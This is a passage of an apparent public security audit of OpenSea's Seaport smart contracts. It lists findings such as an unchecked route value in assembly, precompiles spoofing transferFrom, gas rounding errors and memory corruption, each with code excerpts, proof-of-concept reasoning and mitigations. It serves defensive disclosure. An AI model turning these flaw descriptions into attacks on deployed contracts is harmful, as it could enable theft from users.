</span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fulfilled</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_validateAndFulfillBasicOrder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BasicOrderFulfiller</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OrderValidator</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateAndFulfillBasicOrder</span><span class=\"mtk1\">(  </span><span class=\"mtk12\">BasicOrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\"> ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...   </span><span class=\"mtk3\">// as the parameters are calldata, no checks on out of bound is done</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">BasicOrderRouteType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">route</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receivedItemType</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            route := </span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk11\">calldataload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BasicOrder_basicOrderType_cdPtr</span><span class=\"mtk1\">), </span><span class=\"mtk7\">4</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// doesn&#39;t check for out of range values</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            receivedItemType := </span><span class=\"mtk11\">add</span><span class=\"mtk1\">( </span><span class=\"mtk3\">// if route == 6, then receivedItemType == 4 == ERC721_WITH_CRITERIA</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">route</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk11\">gt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">route</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">)), </span><span class=\"mtk3\">// (6-2) * 1 == 4</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">eq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">route</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2</span><span class=\"mtk1\">)                      </span><span class=\"mtk3\">// + 0 == 4  // this is a valid ItemType </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">additionalRecipientsItemType</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">ItemType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NATIVE</span><span class=\"mtk1\">) {   </span><span class=\"mtk3\">// this is luckily false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...          </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...           </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">route</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">BasicOrderRouteType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ERC20_TO_ERC721</span><span class=\"mtk1\">) {  </span><span class=\"mtk3\">// this catches the out of range value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In the <code>assembly</code> code, check that <code>route</code> is within range.</p>\n<h2 id=\"18-startamount-and-endamount-being-different-would-severely-limit-partial-orders\" style=\"position:relative;\"><a href=\"#18-startamount-and-endamount-being-different-would-severely-limit-partial-orders\" aria-label=\"18 startamount and endamount being different would severely limit partial orders permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[18] <code>startAmount</code> and <code>endAmount</code> being different would severely limit partial orders</h2>\n<p>Let $n$ and $d$ represent <code>numerator</code> and <code>denominator</code> respectively, where $n \\le d$. Similarly, $s$ and $e$ represent <code>startAmount</code> and <code>endAmount</code>. Assume that $s \\neq e$ and for the sake of simplicity let’s assume that $n$ and $d$ are in reduced form (coprime, i.e., $\\operatorname{gcd}(n, d) = 1$).</p>\n<p>Then, the following conditions have to be true for an order (here $a \\mid b$ means $a$ divides $b$):</p>\n<ul>\n<li>$d \\mid s$: <a href=\"https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/AmountDeriver.sol#L155\">AmountDeriver.sol#L155</a>.</li>\n<li>$d \\mid e$: <a href=\"https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/AmountDeriver.sol#L156\">AmountDeriver.sol#L156</a>.</li>\n</ul>\n<p>This severely limits the possibilities of an order. For example, if $\\operatorname{gcd}(s, e) = 1$, then a strict partial order is impossible—only a full fill (<code>1 / 1</code>) would ever get past such checks.</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Context:</strong> <a href=\"https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/Seaport.sol\">Seaport.sol</a></p>\n<p>Alice places a partial order with <code>startAmount = 1000</code> and <code>endAmount = 2001</code>. Because <code>1000</code> and <code>2001</code> are coprime, such an order can only be fully filled.</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Partially fillable orders with <code>gcd(startAmount, endAmount) == 1</code> should ideally be disallowed. This may be done at the frontend to simplify the code.</p>\n<h2 id=\"19-safetransferfrom-transferfrom-to-precompiles-may-succeed-a-deviation-from-ozs-implementation\" style=\"position:relative;\"><a href=\"#19-safetransferfrom-transferfrom-to-precompiles-may-succeed-a-deviation-from-ozs-implementation\" aria-label=\"19 safetransferfrom transferfrom to precompiles may succeed a deviation from ozs implementation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[19] SafeTransferFrom: <code>transferFrom</code> to precompiles may succeed, a deviation from OZ’s implementation</h2>\n<p><strong>Context</strong>: <a href=\"https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/TokenTransferrer.sol#L72\">TokenTransferrer.sol#L72</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// If the token has no code or the transfer failed:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Equivalent to `or(iszero(success), iszero(extcodesize(token)))`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// but after it&#39;s inverted for JUMPI this expression is cheaper.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> </span><span class=\"mtk11\">iszero</span><span class=\"mtk1\">(</span><span class=\"mtk11\">and</span><span class=\"mtk1\">(</span><span class=\"mtk11\">iszero</span><span class=\"mtk1\">(</span><span class=\"mtk11\">iszero</span><span class=\"mtk1\">(</span><span class=\"mtk11\">extcodesize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">success</span><span class=\"mtk1\">)) {</span></span></span></code></pre>\n<p>The <code>extcodesize</code> check is only done here. In contrast, the Openzeppelin implementation would do the <code>extcodesize</code> check before calling the function. Here’s where this function and OZ’s safetransfer would deviate: the <code>token</code> address is a precompile (so <code>extcodesize() == 0</code>), but it can still return data. For the same calldata <code>abi.encodeWithSelector(ERC20.transferFrom.selector, from, to, amount)</code>:</p>\n<ol>\n<li>it should return at least 32 bytes, (this is easy, for example the identity precompile at address <code>4</code>).</li>\n<li>the first 32 bytes of the <code>returndata</code> is 1. This looks a bit tricky to achieve, but perhaps with the right parameters, the <code>modexp</code> precompile should do the trick?</li>\n</ol>\n<p>There were some concerns of being able to spoof this function <a href=\"https://twitter.com/z0age/status/1528188150077542400\">source</a>.</p>\n<p>It’s also arguable that this is really a problem. Since <code>0.8.10</code>, the high level call <code>ERC20.transferFrom(...)</code> would skip the <code>extcodesize</code> check because it’s always followed up by a <code>abi.decode(...)</code>. But <code>transferFrom</code> is a bit of a grey area because it needs compatibility with non-compliant ERC20 tokens like USDT.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>It is hard to make a proof of concept for this. In the future, a new precompile may change this. </p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider adding an <code>extcodesize()</code> check before <code>call</code>. However, this adds an extra <code>100</code> gas and we can understand if the protocol decides to not implement this. :)</p>\n<h2 id=\"20-the-gas-computation-for-memory-expansion-rounds-down-instead-of-rounding-up\" style=\"position:relative;\"><a href=\"#20-the-gas-computation-for-memory-expansion-rounds-down-instead-of-rounding-up\" aria-label=\"20 the gas computation for memory expansion rounds down instead of rounding up permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[20] The gas computation for memory expansion rounds down instead of rounding up</h2>\n<p><strong>Context</strong>: <a href=\"https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/LowLevelHelpers.sol#L54\">LowLevelHelpers.sol#L54</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returndatasize</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// Ensure that sufficient gas is available to copy returndata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// while expanding memory where necessary. Start by computing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// the word size of returndata and allocated memory.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">returnDataWords</span><span class=\"mtk1\"> := </span><span class=\"mtk10\">div</span><span class=\"mtk1\">(</span><span class=\"mtk10\">returndatasize</span><span class=\"mtk1\">(), </span><span class=\"mtk10\">OneWord</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<p>This rounds down the number of words (for example, if <code>returndatasize() = 31</code> the correct number of words is 1). The number of words is defined rounded up in EVM.</p>\n<p>For a precise calculation, it should be <code>div(add(returndatasize(), 31), 32)</code>. A typical routine in internal compiler code. <a href=\"https://github.com/ethereum/solidity/blob/02567fd3b47cc4ca3c5d2617c4e2033a8ebe1eb8/libsolidity/codegen/YulUtilFunctions.cpp#L595\">Here</a> is how the Solidity compiler does it. </p>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The above issue can affect the gas computation for <code>returndata</code>, although unlikely to the point that it is severe as the computation is still making some assumptions about <code>msize</code>.</p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Replace the rounding from down to up.</p>\n<h2 id=\"21-tokentransferrer_performerc1155batchtransfers-leaves-corrupted-memory\" style=\"position:relative;\"><a href=\"#21-tokentransferrer_performerc1155batchtransfers-leaves-corrupted-memory\" aria-label=\"21 tokentransferrer_performerc1155batchtransfers leaves corrupted memory permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[21] <code>TokenTransferrer._performERC1155BatchTransfers</code> leaves corrupted memory</h2>\n<p>The function will overwrite memory starting from the <code>0x20</code> offset at least <code>0x104</code> bytes (<code>BatchTransfer1155Params_data_length_basePtr</code> * <code>idsLength</code>).</p>\n<p>In case of successful completion, it will only “restore” the free memory pointer to the starting value (<code>mstore(FreeMemoryPointerSlot, DefaultFreeMemoryPointer)</code>), which is likely invalid, and will leave the zero slot and any potential user memory area dirty.</p>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This function is only used in the <code>Conduit</code> in two places, <code>executeBatch1155</code> and <code>executeWithBatch1155</code>, e.g.:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeBatch1155</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ConduitBatch1155Transfer</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">batchTransfers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">magicValue</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure that the caller has an open channel.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_channels</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ChannelClosed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Perform 1155 batch transfers.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_performERC1155BatchTransfers</span><span class=\"mtk1\">(</span><span class=\"mtk12\">batchTransfers</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Return a magic value indicating that the transfers were performed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">magicValue</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executeBatch1155</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The only statement after it is returning a value type, and both of these functions are marked external, so likely this is not causing any problems the way it is used currently, but the library function is unsafe in itself.</p>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Properly restore the corrupted memory area, similar to what <code>_performERC1155Transfer</code> is doing.</p>\n<h2 id=\"22-_triggerifarmed-done-outside-of-reentrancy-guards\" style=\"position:relative;\"><a 